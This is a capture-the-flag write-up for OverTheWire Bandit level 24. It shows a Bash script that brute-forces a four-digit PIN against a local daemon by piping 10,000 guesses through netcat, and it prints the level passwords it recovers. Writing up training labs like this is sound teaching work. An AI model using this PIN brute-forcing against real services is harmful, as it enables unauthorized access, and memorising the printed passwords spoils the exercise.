# Bandit Level 24 → Level 25

### 🎯 Objective
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10,000 combinations, called brute-forcing.
You do not need to create new connections each time.

### 🔍 Information & Clues
• Host: bandit.labs.overthewire.org
• Port: 2220
• Username: bandit24
• Commands to research: nc, mktemp, chmod, sort, grep

### 💡 Thought Process & Steps

1. **Connecting:**
I logged into the level using SSH:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

2. **Enumeration:**
First, I connected to the port with nc (netcat) to see the prompt and its response:

```text
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
Wrong! Please enter the correct pincode. Try again.
```

We see that when we send the wrong pincode, we get a single-line response. This is important for filtering the output later.

3. **Scripting & Execution:**
Since brute-forcing the pincode by hand would be quite tedious, I wrote a Bash script to automate it:

```bash
#!/bin/bash

for i in {0000..9999}
do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

As you can see, the script is divided into two parts:

• First, a for loop iterates over all possible 4-digit pincodes and appends each combination to a file called possibilities.txt.
• Second, the contents of possibilities.txt are piped into the daemon via nc, and the output is saved to result.txt.

Now that the script is ready, we need a safe place to save and run it. I created a temporary directory, saved the script there, and made it executable:

```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.3YQNHtW1Uu
bandit24@bandit:~$ cd /tmp/tmp.3YQNHtW1Uu
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ nano brute_force_pin.sh
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ chmod +x brute_force_pin.sh
```

Next, we run the script and verify that both output files were created:

```bash
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ ./brute_force_pin.sh 
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ ls
brute_force_pin.sh  possibilities.txt  result.txt
```

4. **Reading the Flag:**
result.txt contains the server's response for every pincode attempt. Using what we learned earlier, we can use grep -v to filter out all lines containing "Wrong!" so that only the banner and the winning response remain:

```text
bandit24@bandit:/tmp/tmp.3YQNHtW1Uu$ sort result.txt | grep -v "Wrong!"

Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

### 🔑 Key Features Learned
* **Bash Brace Expansion ({0000..9999}):** Automatically generates zero-padded numeric sequences, making it easy to build brute-force wordlists directly in a script.
* **Persistent Netcat Connections:** Piping a file into nc sends all payloads over a single TCP connection, which is much faster than opening a new connection for every guess.
* **Inverted Filtering (grep -v):** Allows you to exclude thousands of repetitive failure messages from logs or outputs to quickly isolate the single successful response.

### 🏁 Password/Flag
`💾 SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`